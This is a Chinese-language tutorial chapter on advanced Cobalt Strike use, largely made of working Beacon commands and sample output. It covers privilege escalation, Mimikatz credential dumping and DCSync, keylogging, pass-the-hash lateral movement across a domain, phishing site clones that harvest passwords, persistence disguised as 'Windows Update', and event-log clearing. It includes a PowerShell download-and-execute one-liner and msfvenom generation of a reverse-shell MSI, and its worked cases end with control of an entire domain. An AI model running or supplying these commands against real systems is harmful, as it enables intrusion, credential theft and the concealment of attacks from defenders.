---
outline: deep
---

# 第58章 Cobalt Strike进阶

> **难度等级：🔴 特等级**
>
> **预计学习时间：180分钟**
>
> **本章看点：Beacon命令详解、提权模块、凭据获取、横向移动、代理转发、钓鱼攻击、浏览器Pivoting、Aggressor Script、插件开发、权限维持、痕迹清理、10个必备插件、5个实战案例、20道习题**

::: tip 说明
上一章我们学习了Cobalt Strike的基础，
包括搭建、界面、Beacon基础等。

这一章我们来学习
CS的进阶功能，
这些才是CS真正强大的地方。

主要内容包括：
- Beacon命令详解（30+常用命令）
- 权限提升模块
- 凭据获取模块
- 横向移动模块
- 内网代理与转发
- 钓鱼攻击模块
- 浏览器Pivoting
- Aggressor Script脚本编写
- 插件开发入门
- 权限维持
- 痕迹清理
- 常用插件推荐

内容很多，
但都是实战中
经常会用到的。

准备好了吗？
开始！
:::

---

## 58.1 Beacon命令详解

### 58.1.1 命令分类

Beacon的命令很多，
我们可以按功能分类：

```
Beacon命令
├── 基础命令
│   ├── help - 帮助
│   ├── sleep - 设置睡眠时间
│   ├── checkin - 强制回连
│   ├── clear - 清除队列
│   ├── exit - 退出
│   └── note - 添加备注
│
├── 信息收集
│   ├── whoami / getuid - 当前用户
│   ├── hostname - 主机名
│   ├── ipconfig / ifconfig - 网络配置
│   ├── netstat - 网络连接
│   ├── ps - 进程列表
│   ├── pwd - 当前目录
│   ├── ls - 列出文件
│   ├── drivers - 驱动列表
│   └── idletime - 空闲时间
│
├── 命令执行
│   ├── shell - 执行CMD命令
│   ├── run - 运行程序（不等待）
│   ├── execute - 执行程序
│   ├── powershell - 执行PowerShell
│   ├── powershell-import - 导入PS脚本
│   └── pth - 哈希传递
│
├── 文件操作
│   ├── upload - 上传文件
│   ├── download - 下载文件
│   ├── cd - 切换目录
│   ├── mkdir - 创建目录
│   ├── rm - 删除文件
│   ├── cp - 复制文件
│   ├── mv - 移动文件
│   └── cat - 查看文件
│
├── 进程操作
│   ├── ps - 列出进程
│   ├── kill - 结束进程
│   ├── inject - 注入进程
│   ├── spawn - 生成新Beacon
│   ├── spawnas - 用指定用户生成
│   ├── spawnto - 设置spawn路径
│   └── getsystem - 获取System
│
├── 凭据获取
│   ├── hashdump - 导出哈希
│   ├── logonpasswords - 登录密码
│   ├── mimitokens - 令牌操作
│   ├── kerberos::list - 列出票据
│   ├── keylogger - 键盘记录
│   └── screenshot - 屏幕截图
│
├── 横向移动
│   ├── psexec - PsExec执行
│   ├── wmi - WMI执行
│   ├── winrm - WinRM执行
│   ├── ssh - SSH执行
│   ├── winrs - WinRS执行
│   └── dcom - DCOM执行
│
├── 网络操作
│   ├── portfwd - 端口转发
│   ├── rportfwd - 反向端口转发
│   └── socks - SOCKS代理
│
├── 权限维持
│   ├── persistence - 持久化
│   ├── schtasks - 计划任务
│   └── 其他后门
│
└── 其他
    ├── timestomp - 时间戳伪造
    ├── clearev - 清除日志
    ├── jobkill - 结束任务
    ├── jobs - 列出任务
    └── bof - 执行BOF
```

### 58.1.2 常用命令详解

**基础类：**

```
beacon> help
# 查看所有命令的帮助

beacon> sleep 300 20
# 设置睡眠时间为300秒，抖动20%（240-360秒）

beacon> checkin
# 强制Beacon立即回连

beacon> note "这是Web服务器，重要"
# 给Beacon添加备注

beacon> clear
# 清除待执行的命令队列

beacon> exit
# 退出Beacon（Beacon会自行删除）
```

**信息收集类：**

```
beacon> getuid
# 查看当前用户ID

beacon> idletime
# 查看用户空闲了多久（社工钓鱼时有用）

beacon> drivers
# 列出驱动程序（查找杀软）

beacon> netstat -ano
# 查看网络连接

beacon> net domain
# 查看域信息

beacon> net dclist
# 列出域控制器

beacon> net computers
# 列出域内计算机

beacon> net users
# 列出域用户

beacon> net groups
# 列出域组

beacon> net groupadmins
# 列出组管理员
```

**命令执行类：**

```
beacon> shell dir C:\
# 执行CMD命令，有回显

beacon> run notepad.exe
# 运行程序，不等待输出

beacon> execute -i cmd.exe
# 执行交互式程序

beacon> execute-assembly /path/to/SharpHound.exe -c All
# 执行.NET程序集（BOF的一种）

beacon> powershell -nop -c "Get-Process"
# 执行PowerShell命令

beacon> powershell-import PowerView.ps1
# 导入PowerShell脚本
beacon> powershell Get-NetUser
# 执行导入脚本中的命令

beacon> pth DOMAIN\user NTLM哈希
# 哈希传递，创建新令牌
```

**文件操作类：**

```
beacon> upload /local/path/file.exe
# 上传文件到目标

beacon> download C:\path\file.txt
# 下载文件到本地

beacon> timestomp C:\target.txt C:\source.txt
# 伪造文件时间戳（把target的时间改成source的）

beacon> ls -l C:\
# 列出文件，显示详细信息
```

**进程操作类：**

```
beacon> ps
# 列出所有进程

beacon> ps x64
# 只列出64位进程

beacon> ps explorer
# 查找explorer进程

beacon> inject 1234 x64 listener_name
# 注入Beacon到PID为1234的进程

beacon> spawn x64 listener_name
# 生成一个新的Beacon子进程

beacon> spawnas DOMAIN\user password x64 listener_name
# 用指定用户的身份生成Beacon

beacon> spawnto x64 C:\Windows\System32\notepad.exe
# 设置spawn使用的程序路径

beacon> getsystem
# 尝试获取System权限（4种方法）
```

### 58.1.3 实用技巧

**技巧一：用别名简化命令**

可以在Aggressor Script中
定义命令别名。

**技巧二：批量操作**

选中多个Beacon，
右键 → 选择操作，
可以批量执行命令。

**技巧三：快捷键**

- `Ctrl+E` - 清空输出
- `Ctrl+F` - 搜索输出
- `Ctrl+C` - 复制
- `Ctrl+V` - 粘贴

---

## 58.2 权限提升模块

### 58.2.1 getsystem

getsystem是Beacon内置的
提权命令，
会尝试4种方法获取System权限。

```
beacon> getsystem
[*] Tasked beacon to get system
[+] host called home, sent: 1 bytes
[+] Granted system! (technique 1)
```

**四种方法：**
1. 令牌复制（Token Duplication）
2. 命名管道模拟（Named Pipe Impersonation）
3. 令牌窃取（Token Theft）
4. 服务提升（Service Escalation）

::: tip 说明
getsystem不是每次都能成功，
要看具体环境和当前权限。
如果getsystem失败了，
可以用elevate模块。
:::

### 58.2.2 elevate提权模块

CS内置了一些提权EXP，
可以通过elevate命令使用。

**查看可用的提权模块：**

```
beacon> elevate
[*] Valid elevate exploits:
    ...列出可用的提权模块...
```

**使用提权模块：**

```
beacon> elevate ms14-058 listener_name
# 使用ms14-058漏洞提权，生成新的System权限Beacon
```

**常见的内置提权模块：**

| 模块名 | 漏洞 | 说明 |
|--------|------|------|
| ms14-058 | CVE-2014-4113 | Win32k漏洞 |
| ms15-051 | CVE-2015-1701 | Windows内核漏洞 |
| ms16-016 | CVE-2016-0051 | WebDAV漏洞 |
| ms16-032 | CVE-2016-0099 | Secondary Logon服务 |
| uacme | UAC绕过 | 绕过UAC |

### 58.2.3 右键提权菜单

除了命令行，
也可以用图形界面操作：

在Beacon上右键 → Access → Elevate
选择提权模块和监听器，
点击Launch即可。

### 58.2.4 自定义提权模块

可以通过Aggressor Script
添加自定义的提权模块。

```sleep
# 示例：添加一个提权模块
elevate exploit_name {
    bin_path    = script_resource("exploit.exe");
    description = "自定义提权EXP";
    targets     = @("x86", "x64");

    if(-exists $null $1 "arch x64") {
        bin_path = script_resource("exploit.x64.exe");
    }

    # 执行提权
    bexecute($1, $null, $bin_path);
}
```

---

## 58.3 凭据获取模块

### 58.3.1 hashdump

hashdump用来导出
本地SAM数据库中的用户哈希。

```
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 1 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec82052ec409a62e1b5d8252:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
testuser:1000:aad3b435b51404eeaad3b435b51404ee:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:::
```

导出的哈希格式：
`用户名:RID:LM哈希:NTLM哈希:::`

这些哈希会自动保存到
CS的凭据数据库中。

::: tip 注意
hashdump需要管理员以上权限。
如果是普通用户，
需要先提权。
:::

### 58.3.2 logonpasswords

logonpasswords使用Mimikatz
导出内存中的登录凭据。

```
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 1 bytes
[+] received output:

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : testuser
Domain            : WIN-TEST
Logon Server      : WIN-TEST
Logon Time        : 2024/01/01 10:00:00
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : testuser
         * Domain   : WIN-TEST
         * LM       : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
         * NTLM     : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
         * SHA1     : bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
        tspkg :
        wdigest :
         * Username : testuser
         * Domain   : WIN-TEST
         * Password : (null)
        kerberos :
         * Username : testuser
         * Domain   : WIN-TEST
         * Password : (null)
        ssp :
        credman :
```

::: tip 说明
logonpasswords实际上
就是调用Mimikatz的
sekurlsa::logonpasswords命令。

CS内置了Mimikatz，
可以直接使用。
:::

### 58.3.3 其他Mimikatz命令

CS集成了Mimikatz的功能，
可以通过命令直接调用。

```
beacon> mimikatz sekurlsa::logonpasswords
# 导出登录密码

beacon> mimikatz sekurlsa::ekeys
# 导出Kerberos密钥

beacon> mimikatz sekurlsa::tickets /export
# 导出Kerberos票据

beacon> mimikatz kerberos::list
# 列出Kerberos票据

beacon> mimikatz kerberos::ptt ticket.kirbi
# 注入票据

beacon> mimikatz lsadump::sam
# 导出SAM哈希

beacon> mimikatz lsadump::secrets
# 导出LSA机密

beacon> mimikatz lsadump::dcsync /domain:corp.com /user:krbtgt
# DCSync攻击

beacon> mimikatz privilege::debug
# 提升权限

beacon> mimikatz token::elevate
# 令牌提升
```

也可以用 `mimikatz` 命令
执行任意Mimikatz命令。

### 58.3.4 keylogger键盘记录

```
beacon> keylogger
[*] Tasked beacon to start keylogger
[+] host called home, sent: 1 bytes
[+] started keylogger on explorer.exe (1234)
```

键盘记录会保存到
CS的Keystrokes视图中。

查看方式：
View → Keystrokes

### 58.3.5 screenshot屏幕截图

```
beacon> screenshot
[*] Tasked beacon to take a screenshot
[+] host called home, sent: 1 bytes
[+] received screenshot: 1920x1080
```

截图会保存到
CS的Screenshots视图中。

查看方式：
View → Screenshots

也可以设置持续截图：
```
beacon> screenshot 30
# 每30秒截一次图
```

### 58.3.6 凭据管理

所有获取到的凭据
都会自动保存到
CS的凭据数据库中。

查看方式：
View → Credentials

凭据数据库中包括：
- 用户名
- 密码（明文）
- NTLM哈希
- 来源
- 等等...

这些凭据可以在
横向移动时直接使用。

---

## 58.4 横向移动模块

### 58.4.1 psexec

psexec是最经典的
横向移动方法。

```
beacon> psexec 192.168.1.100 listener_name
# 使用当前令牌，通过psexec在目标上生成Beacon

beacon> psexec 192.168.1.100 DOMAIN\user password listener_name
# 使用指定用户名密码

beacon> psexec 192.168.1.100 .\administrator aad3b435b51404eeaad3b435b51404ee:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax64 listener_name
# 使用哈希传递（注意格式：LM:NTLM）
```

也可以用图形界面：
右键目标 → Jump → psexec

### 58.4.2 wmi

通过WMI执行命令，
更隐蔽一些。

```
beacon> wmi 192.168.1.100 listener_name
# 使用WMI生成Beacon

beacon> wmi 192.168.1.100 DOMAIN\user password listener_name
# 指定凭据
```

WMI的优点：
- 不会创建服务
- 相对隐蔽
- 很多环境默认开启

### 58.4.3 winrm / winrs

通过WinRM执行命令。

```
beacon> winrm 192.168.1.100 listener_name
# 使用WinRM生成Beacon

beacon> winrs 192.168.1.100 "whoami"
# 使用WinRS执行命令
```

### 58.4.4 ssh

通过SSH横向移动（Linux）。

```
beacon> ssh 192.168.1.100 user password listener_name
# SSH登录并生成Beacon

beacon> ssh-key 192.168.1.100 user /path/to/key listener_name
# 使用SSH密钥登录
```

### 58.4.5 smbexec

通过SMB执行命令。

```
beacon> jump [method] [target] [listener]
# 通用的横向移动命令
```

**支持的方法：**
- psexec
- psexec64
- psexec_psh
- wmi
- wmi64
- winrm
- winrm64
- smbexec
- ...

### 58.4.6 远程执行命令

除了生成Beacon，
也可以直接远程执行命令。

```
beacon> remote-exec psexec 192.168.1.100 "whoami > C:\temp\out.txt"
# 用psexec远程执行命令

beacon> remote-exec wmi 192.168.1.100 "cmd /c whoami"
# 用WMI远程执行命令

beacon> remote-exec winrm 192.168.1.100 "whoami"
# 用WinRM远程执行命令
```

---

## 58.5 内网代理与转发

### 58.5.1 SOCKS代理

SOCKS代理是最常用的
内网代理方式。

```
beacon> socks 1080
[*] started SOCKS4a server on: 1080
# 在Team Server的1080端口启动SOCKS代理
```

启动后，
就可以在攻击者机器上
通过这个SOCKS代理
访问内网了。

**使用方法：**

1. 配置Proxifier或proxychains
2. 代理地址：Team Server IP
3. 代理端口：1080
4. 代理类型：SOCKS4/SOCKS5

```bash
# proxychains示例
# /etc/proxychains.conf
socks4  Team_Server_IP  1080

# 使用
proxychains nmap -sT 192.168.1.0/24
```

**停止SOCKS代理：**

```
beacon> socks stop
[*] stopped SOCKS4a server on 1080
```

### 58.5.2 portfwd端口转发

portfwd是正向端口转发，
把Team Server的端口
转发到目标内网的端口。

```
beacon> portfwd 3389 192.168.1.100 3389
[*] Tasked beacon to forward 3389 -> 192.168.1.100:3389
[+] host called home, sent: 1 bytes
[+] port forward added
```

这样，
访问Team Server的3389端口，
就相当于访问
192.168.1.100的3389端口。

**查看端口转发：**

```
beacon> portfwd list
# 列出所有端口转发
```

**删除端口转发：**

```
beacon> portfwd remove 3389
# 删除指定的端口转发
```

### 58.5.3 rportfwd反向端口转发

rportfwd是反向端口转发，
把目标机器的端口
反向转发到Team Server。

```
beacon> rportfwd 4444 192.168.1.200 4444
# 把目标的4444端口转发到Team Server的4444
```

**适用场景：**
- 目标内网有个服务，
  需要从Team Server访问
- 反向Shell回连
- 等等...

---

## 58.6 钓鱼攻击模块

### 58.6.1 鱼叉钓鱼（Spear Phish）

CS内置了鱼叉钓鱼功能，
可以发送带附件的钓鱼邮件。

**操作步骤：**

1. 菜单 → Attacks → Spear Phish
2. 配置邮件模板
3. 配置Target列表
4. 配置邮件服务器
5. 发送

**邮件模板：**
可以自己写邮件模板，
也可以用现成的。

**Target列表：**
CSV格式，包含姓名、邮箱等信息。

### 58.6.2 网站克隆（Clone Site）

克隆目标网站，
用来钓鱼。

**操作步骤：**

1. 菜单 → Attacks → Web Drive-by → Clone Site
2. 输入要克隆的URL
3. 配置本地监听端口
4. 配置日志记录（窃取的凭据）
5. 点击Launch

克隆的网站会记录
用户输入的用户名密码。

### 58.6.3 System Profiler

系统分析器，
用来收集访客的
系统和浏览器信息。

**操作步骤：**

1. 菜单 → Attacks → Web Drive-by → System Profiler
2. 配置URL和端口
3. 配置重定向URL
4. 点击Launch

当受害者访问这个页面时，
会收集他的：
- 操作系统
- 浏览器版本
- 插件信息
- Java版本
- 等等...

### 58.6.4 Scripted Web Delivery

脚本化Web分发，
通过Web服务器
分发Payload。

**操作步骤：**

1. 菜单 → Attacks → Web Drive-by → Scripted Web Delivery (S)
2. 选择监听器
3. 选择类型（PowerShell、Python等）
4. 配置端口和路径
5. 点击Launch

会生成一行命令，
在目标上执行就能上线。

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://IP:8080/a'))"
```

---

## 58.7 浏览器Pivoting

### 58.7.1 什么是浏览器Pivoting？

浏览器Pivoting
（浏览器 pivot）
是CS的一个独特功能。

简单来说，
就是**利用目标的浏览器**
作为代理去访问网站。

这样做的好处：
- 使用目标的浏览器环境
- 使用目标的Cookie和Session
- 可以访问目标能访问的内网网站
- 不会留下你的IP

### 58.7.2 使用方法

**启动浏览器Pivoting：**

在Beacon上右键 → Explore → Browser Pivot

选择要注入的浏览器进程，
点击Launch。

**配置代理：**

启动后，
CS会在Team Server上
启动一个代理端口。

在本地浏览器中
配置这个代理，
然后就可以
用目标的浏览器身份
访问网站了。

### 58.7.3 应用场景

1. **访问内网Web应用** - 用目标身份访问内网网站
2. **利用Cookie** - 直接用目标的登录状态
3. **绕过认证** - 不需要密码，用目标的Session
4. **社工钓鱼** - 更真实的钓鱼

---

## 58.8 CS脚本编写（Aggressor Script）

### 58.8.1 什么是Aggressor Script？

Aggressor Script是
Cobalt Strike的脚本语言，
基于Sleep语言。

用它可以：
- 自定义菜单和功能
- 扩展Beacon命令
- 自动化操作
- 修改界面
- 编写插件
- 等等...

### 58.8.2 基础语法

Aggressor Script
基于Sleep语言，
语法和Perl、Python类似。

```sleep
# 这是注释

# 变量
$var = "hello";
$num = 123;

# 输出
println("Hello, world!");

# 数组
@array = @("a", "b", "c");

# 哈希（字典）
%hash = %(key1 => "value1", key2 => "value2");

# 条件语句
if ($var eq "hello") {
    println("yes");
}
else {
    println("no");
}

# 循环
for ($i = 0; $i < 10; $i++) {
    println($i);
}

# 函数
sub function_name {
    $param = $1;
    return "result";
}
```

### 58.8.3 常用API

**Beacon相关：**

```sleep
# 给Beacon发送命令
binput($bid, "shell whoami");

# 获取Beacon信息
beacon_info($bid);

# 列出所有Beacon
beacons();
```

**菜单相关：**

```sleep
# 添加Beacon右键菜单
popup beacon_bottom {
    item "我的功能" {
        # 菜单点击后的操作
        $bid = $1;
        println("Beacon ID: $bid");
    }
}

# 添加子菜单
popup beacon_bottom {
    menu "我的菜单" {
        item "功能1" { ... }
        item "功能2" { ... }
    }
}
```

**事件相关：**

```sleep
# 监听新Beacon上线事件
on beacon_initial {
    $bid = $1;
    $info = beacon_info($bid);
    println("New beacon: " . $info['user'] . "@" . $info['computer']);
}

# 监听Beacon输出
on beacon_output {
    $bid = $1;
    $data = $2;
    # 处理输出
}
```

### 58.8.4 简单脚本示例

**示例1：一键信息收集**

```sleep
# 添加一个一键信息收集的菜单
popup beacon_bottom {
    menu "信息收集" {
        item "一键收集" {
            $bid = $1;
            binput($bid, "whoami");
            binput($bid, "hostname");
            binput($bid, "ipconfig");
            binput($bid, "net user /domain");
            binput($bid, "net group \"domain admins\" /domain");
        }

        item "系统信息" {
            $bid = $1;
            binput($bid, "systeminfo");
        }
    }
}
```

**示例2：Beacon上线自动通知**

```sleep
# 新Beacon上线时自动收集信息
on beacon_initial {
    $bid = $1;
    $info = beacon_info($bid);

    println("=" x 50);
    println("新Beacon上线！");
    println("主机: " . $info['computer']);
    println("用户: " . $info['user']);
    println("IP:   " . $info['ip']);
    println("系统: " . $info['os']);
    println("=" x 50);

    # 自动收集基本信息
    binput($bid, "ipconfig");
    binput($bid, "net user");
}
```

### 58.8.5 加载脚本

**方法一：命令行加载**

```bash
./agscript 服务器IP 端口 用户名 密码 script.cna
```

**方法二：脚本管理器**

1. 菜单 → Cobalt Strike → Script Manager
2. 点击 Load
3. 选择脚本文件
4. 点击Open

脚本加载后立即生效。

---

## 58.9 CS插件开发入门

### 58.9.1 什么是CS插件？

CS插件本质上就是
Aggressor Script脚本，
通常会包含：
- 脚本文件（.cna）
- 资源文件（exe、dll、ps1等）
- 说明文档

### 58.9.2 插件结构

```
my_plugin/
├── my_plugin.cna    # 主脚本文件
├── resources/       # 资源文件目录
│   ├── tool.exe
│   ├── tool.ps1
│   └── ...
└── README.md        # 说明文档
```

### 58.9.3 简单插件示例

**示例：添加一个提权插件**

```sleep
# my_elevate.cna

# 定义提权模块
elevate my_exploit {
    # 提权模块信息
    info("自定义提权EXP");

    # 支持的架构
    targets(@("x86", "x64"));

    # 设置EXE路径
    if(-exists $null $1 "arch x64") {
        bin_path(script_resource("resources/exploit_x64.exe"));
    }
    else {
        bin_path(script_resource("resources/exploit_x86.exe"));
    }

    # 执行提权
    execute($1, $null, $3 . " " . $4);
}

# 添加菜单
popup beacon_bottom {
    menu "提权" {
        item "自定义提权" {
            $bid = $1;
            # 弹出对话框选择监听器
            $listener = prompt_listener("选择监听器：");
            if ($listener eq "") {
                return;
            }

            # 执行提权
            binput($bid, "elevate my_exploit $listener");
        }
    }
}
```

### 58.9.4 插件开发资源

- **官方文档** - CS自带的帮助文档
- **Sleep语言文档** - Sleep语言官方文档
- **GitHub** - 搜索cobalt strike aggressor script
- **社区论坛** - 各种安全社区

---

## 58.10 权限维持（persistence模块）

### 58.10.1 内置persistence模块

CS内置了一些
权限维持的功能。

**操作方式：**
右键Beacon → Access → Persistence

**支持的方式：**
- 服务（Service）
- 注册表Run键
- 计划任务（Scheduled Task）
- WMI事件订阅

### 58.10.2 服务后门

```
beacon> run sc create "Windows Update Service" binPath= "C:\Windows\beacon.exe" start= auto DisplayName= "Windows Update Service"
# 创建服务

beacon> run net start "Windows Update Service"
# 启动服务
```

### 58.10.3 注册表Run键

```
beacon> run reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /t REG_SZ /d "C:\Windows\beacon.exe" /f
# 当前用户Run键

beacon> run reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /t REG_SZ /d "C:\Windows\beacon.exe" /f
# 系统Run键（需要管理员权限）
```

### 58.10.4 计划任务

```
beacon> run schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\beacon.exe" /sc onlogon /ru SYSTEM
# 用户登录时执行

beacon> run schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\beacon.exe" /sc minute /mo 30 /ru SYSTEM
# 每30分钟执行一次
```

### 58.10.5 WMI事件订阅

WMI事件订阅比较隐蔽，
是高级的持久化方式。

可以通过工具或脚本实现，
比如PowerShell的
New-WmiEventConsumer等。

---

## 58.11 痕迹清理

### 58.11.1 clearev命令

clearev是CS内置的
日志清除命令。

```
beacon> clearev
[*] Tasked beacon to clear application, system, and security event logs
[+] host called home, sent: 1 bytes
[+] application, system, security event logs cleared on WIN-TEST
```

它会清除：
- 应用程序日志（Application）
- 系统日志（System）
- 安全日志（Security）

### 58.11.2 手动清理

**清除其他日志：**

```
beacon> shell wevtutil cl Setup
# 清除安装日志

beacon> shell wevtutil cl ForwardedEvents
# 清除转发的事件

beacon> shell wevtutil cl "Windows PowerShell"
# 清除PowerShell日志
```

**清除文件痕迹：**

```
beacon> rm C:\temp\tool.exe
# 删除上传的工具

beacon> timestomp C:\Windows\beacon.exe C:\Windows\explorer.exe
# 伪造文件时间戳
```

**清除网络痕迹：**

```
beacon> shell net use * /del /y
# 清除网络连接

beacon> shell ipconfig /flushdns
# 清除DNS缓存

beacon> shell arp -d *
# 清除ARP缓存
```

### 58.11.3 注意事项

1. **不要全清** - 把日志全清了反而引人怀疑
2. **选择性删除** - 只删除和自己操作相关的日志
3. **伪造日志** - 高级技巧，伪造正常的日志
4. **减少操作** - 最好的清理是少留痕迹
5. **事后清理** - 撤退前统一清理

---

## 58.12 常用插件推荐

### 58.12.1 必备插件TOP10

| 插件名 | 功能 | 说明 |
|--------|------|------|
| CobaltStrike-Plugin-Pack | 插件合集 | 包含很多实用插件 |
| Ebowla | Payload加密 | 绕过静态检测 |
| ThreatCheck | 免杀检测 | 检测哪部分被查杀 |
| ScriptManager | 脚本管理 | 管理Aggressor脚本 |
| pybeacon | Beacon控制 | Python控制Beacon |
| BOF集合 | BOF合集 | 大量实用BOF |
| AvQuery | 杀软检测 | 检测目标的杀软 |
| WinPwn | 提权工具 | Windows提权脚本合集 |
| Inveigh | 欺骗工具 | LLMNR/NBT-NS欺骗 |
| Rubeus | Kerberos工具 | 票据操作 |

### 58.12.2 去哪里找插件？

- **GitHub** - 搜索 Cobalt Strike plugin / aggressor script
- **CS官方社区** - 官方论坛
- **安全社区** - FreeBuf、先知、看雪等
- **Telegram/Discord** - 各种安全频道
- **自己写** - 最适合自己的还是自己写

### 58.12.3 使用插件注意事项

1. **安全第一** - 第三方插件可能有后门
2. **代码审计** - 使用前最好看一下代码
3. **测试环境** - 先在测试环境试试
4. **不要乱用** - 按需使用，不要装一堆没用的
5. **定期更新** - 插件可能会有bug，注意更新

---

## 📚 案例1：CS提权完整演示

### 场景描述
你拿到了一台Windows机器的
普通用户权限Beacon，
目标：提升到System权限。

### 操作过程

**第一步：查看当前权限**

```
beacon> getuid
[*] Tasked beacon to get userid
[+] uid=testuser(1000) gid=testuser(1000) groups=testuser(1000),....
```

当前是普通用户权限。

**第二步：尝试getsystem**

```
beacon> getsystem
[*] Tasked beacon to get system
[+] host called home, sent: 1 bytes
[-] could not grant system
```

getsystem失败了。

**第三步：上传提权工具**

```
beacon> cd C:\temp
[*] Tasked beacon to cd to C:\temp
[+] changed directory

beacon> upload /tools/WinPEAS.exe
[*] Tasked beacon to upload /tools/WinPEAS.exe as WinPEAS.exe
[+] uploaded 1234567 bytes
```

**第四步：运行WinPEAS扫描**

```
beacon> shell WinPEAS.exe > result.txt
[*] Tasked beacon to run: WinPEAS.exe > result.txt
[+] received output:

beacon> download result.txt
[*] Tasked beacon to download result.txt
[+] download of result.txt complete
```

分析结果，
发现存在 `AlwaysInstallElevated` 漏洞。

**第五步：使用MSI提权**

```bash
# 生成MSI木马
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Team_Server_IP LPORT=4444 -f msi -o evil.msi
```

上传并执行：

```
beacon> upload evil.msi
[*] Tasked beacon to upload evil.msi
[+] uploaded 56789 bytes

beacon> run msiexec /quiet /i evil.msi
[*] Tasked beacon to run: msiexec /quiet /i evil.msi
[+] host called home, sent: 1 bytes
```

几秒钟后，
新的System权限Beacon上线了！

**第六步：验证权限**

```
beacon> getuid
[*] Tasked beacon to get userid
[+] uid=SYSTEM(4) gid=SYSTEM(4) groups=....
```

成功拿到System权限！

**第七步：导出哈希**

```
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec82052ec409a62e1b5d8252:::
...
```

### 经验总结
1. getsystem不一定每次都成功
2. 提权前先枚举，找到合适的路径
3. WinPEAS/PowerUp是提权好帮手
4. 提权方法很多，多准备几种
5. 提权后记得导出凭据

---

## 📚 案例2：CS哈希抓取与传递

### 场景描述
你已经拿到了一台机器的System权限，
现在要获取凭据并横向移动。

### 操作过程

**第一步：导出本地哈希**

```
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec82052ec409a62e1b5d8252:::
testuser:1000:aad3b435b51404eeaad3b435b51404ee:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:::
```

**第二步：导出内存中的凭据**

```
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] received output:
...（大量凭据信息）

发现有一个域用户的凭据：
svc_sql : Password123!
```

**第三步：查看凭据数据库**

打开 View → Credentials，
可以看到所有获取到的凭据
已经自动保存了。

**第四步：扫描内网**

先做个端口扫描，
看看内网有哪些机器。

```
beacon> shell net view /domain
[*] Tasked beacon to run: net view /domain
[+] received output:
\\WEB01
\\SQL01
\\FILE01
\\DC01
...
```

**第五步：哈希传递横向移动**

发现SQL01这台机器，
试试本地管理员哈希能不能用。

```
beacon> jump psexec SQL01 http_listener
# 使用当前令牌（或者用pth先创建令牌）
```

如果不行，
试试用获取到的凭据：

```
beacon> jump psexec SQL01 CORP\svc_sql Password123! http_listener
# 使用明文密码
```

或者用哈希：

```
beacon> pth CORP\administrator aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec82052ec409a62e1b5d8252
[*] Tasked beacon to create a token for CORP\administrator
[+] host called home, sent: 1 bytes
[+] Impersonated CORP\administrator

beacon> jump psexec SQL01 http_listener
# 现在使用的是模拟的令牌
```

**第六步：登录更多机器**

有了域管理员的哈希，
就可以登录所有机器了。

```
beacon> jump psexec DC01 http_listener
beacon> jump psexec FILE01 http_listener
beacon> jump psexec WEB01 http_listener
...
```

一台台横向移动，
控制整个域。

### 经验总结
1. 拿到机器后第一时间导出凭据
2. hashdump导本地哈希
3. logonpasswords导内存凭据
4. 凭据会自动保存，方便横向移动
5. 哈希传递是最常用的横向移动方法

---

## 📚 案例3：CS内网横向移动实战

### 场景描述
你控制了一台内网机器，
现在需要横向移动到
其他机器上。

### 操作过程

**第一步：信息收集**

```
beacon> ipconfig
# 查看网络配置，确定网段

beacon> shell net view
# 查看同一网段的机器

beacon> shell arp -a
# 查看ARP表
```

确定内网网段：192.168.1.0/24

**第二步：端口扫描**

```
beacon> shell netstat -ano
# 先看本机的网络连接

# 可以上传端口扫描工具
beacon> upload /tools/portscan.exe
beacon> shell portscan.exe 192.168.1.0/24 445
```

或者用CS内置的扫描功能：
右键 → Explore → Port Scan

**第三步：SMB扫描**

扫描哪些机器开了445端口，
然后试试哈希能不能登录。

用CrackMapExec或者其他工具：

```
beacon> upload /tools/cme.exe
beacon> shell cme smb 192.168.1.0/24 -u administrator -H aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

**第四步：选择横向移动方法**

根据开放的端口
选择不同的方法：

- 445端口开放 → psexec / smbexec
- 135端口开放 → wmi / dcom
- 5985端口开放 → winrm
- 3389端口开放 → RDP
- 22端口开放 → ssh

**第五步：批量横向移动**

发现很多机器都可以用
本地管理员哈希登录。

```
beacon> jump psexec 192.168.1.10 http_listener
beacon> jump psexec 192.168.1.11 http_listener
beacon> jump psexec 192.168.1.12 http_listener
...
```

一台台上线，
控制越来越多的机器。

**第六步：SMB Beacon内网通信**

对于内网的机器，
可以用SMB Beacon，
通过命名管道通信，
不需要额外的网络连接。

```
# 先创建一个SMB监听器
# 然后用psexec生成SMB Beacon

beacon> jump psexec 192.168.1.10 smb_listener
```

SMB Beacon会通过
父Beacon中转通信，
更隐蔽。

**第七步：建立SOCKS代理**

控制了内网机器后，
建立SOCKS代理，
方便后续操作。

```
beacon> socks 1080
[*] started SOCKS4a server on: 1080
```

然后本地配置代理，
就可以直接访问内网了。

### 经验总结
1. 横向移动前先做信息收集
2. 根据开放端口选择合适的方法
